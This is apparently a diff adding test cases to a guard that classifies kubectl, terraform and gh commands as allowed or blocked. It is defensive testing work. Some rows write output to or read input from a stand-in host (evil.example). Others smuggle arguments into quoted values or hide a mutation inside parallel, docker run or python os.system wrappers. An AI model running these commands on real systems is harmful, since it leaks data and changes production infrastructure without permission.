+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl --profile heap --profile-output //evil.example/share/p config use-context prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl --context=a config use-context
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config use-context 'prod'--kubeconfig=k
+block:unrecognized	refuse:command is not an allowlisted external mutation	TF_DATA_DIR=d terraform workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select 'prod'-or-create
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input //evil.example/share/f
+allow	refuse:command is not an allowlisted external mutation	kubectl config use-context arn:aws:eks:r:1:cluster/prod
+allow	refuse:command is not an allowlisted external mutation	kubectl config use-context user@cluster
+
+# Carriers of a newly listed mutation: the guard allowed these before.
+block:mutation	refuse:command is not an allowlisted external mutation	parallel terraform taint ::: aws_x.y
+block:mutation	refuse:command is not an allowlisted external mutation	docker run img kubectl run x --image=y
+block:mutation	refuse:command is not an allowlisted external mutation	python3 -c "import os; os.system('terraform taint x')"
